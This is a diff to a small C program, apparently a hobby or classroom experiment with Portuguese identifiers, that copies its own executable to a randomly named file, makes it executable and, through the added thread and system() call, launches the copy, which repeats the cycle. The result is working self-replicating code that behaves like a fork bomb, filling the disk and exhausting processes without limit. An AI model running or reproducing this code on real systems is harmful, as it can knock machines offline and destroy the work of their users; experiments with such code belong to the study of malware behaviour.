@@ -4,6 +4,7 @@
 #include <time.h>
 #include <stdint.h>
 #include <sys/stat.h>
+#include <pthread.h>
 
 #define END_SUCCESS_CODE 0
 
@@ -45,24 +46,45 @@ char * fileName(){
 	return str;
 }
 
-int main(int argc, char ** argv){
-	srand(time(NULL));
+void *reproduzir(void * arg){
+	char *file = (char *)arg;
 	char * name = fileName();
 	
-	FILE * me = fopen(argv[0], "rb");
+	FILE * me = fopen(file, "rb");
 	FILE * rep = fopen(name, "wb");
 
 	char c = ' ';
 	while(! feof(me)){
 		fread(&c, sizeof(char), 1, me);
 	       	fwrite(&c, sizeof(char), 1, rep);
-	}	
-
+	}
+		
 	chmod(name, S_IRUSR | S_IWUSR | S_IXUSR);
 
 	fclose(me);
 	fclose(rep);
 	
+	char cmd[256];
+	strcpy(cmd, "./");
+	strcat(cmd, name);
+	system(cmd);
+	
+
+	pthread_exit(NULL);
+}
+
+int main(int argc, char ** argv){
+	srand(time(NULL));
+
+    	pthread_t minha_thread;
+
+   	if (pthread_create(&minha_thread, NULL, reproduzir, (void *)argv[0])){
+        	fprintf(stderr, "Erro ao criar a thread\n");
+        	return 1;
+	}
+
+    	pthread_join(minha_thread, NULL);
+
 
 	return END_SUCCESS_CODE;
 }
